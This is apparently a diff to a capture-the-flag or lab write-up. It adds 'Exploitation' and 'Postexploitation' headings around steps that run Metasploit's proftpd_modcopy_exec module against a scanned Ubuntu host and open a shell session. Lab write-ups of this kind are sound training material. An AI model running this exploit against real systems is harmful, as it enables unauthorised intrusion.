@@ -18,6 +18,7 @@ PORT     STATE  SERVICE     VERSION
 Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Exploitation
 Let's try the first hit on metasploit:
 
 ``% msfconsole ``
@@ -98,6 +99,8 @@ msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run
 ```
 
 Success, we now have a shell to work with!
+
+## Postexploitation
 ```
 msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1
 [*] Starting interaction with 1...
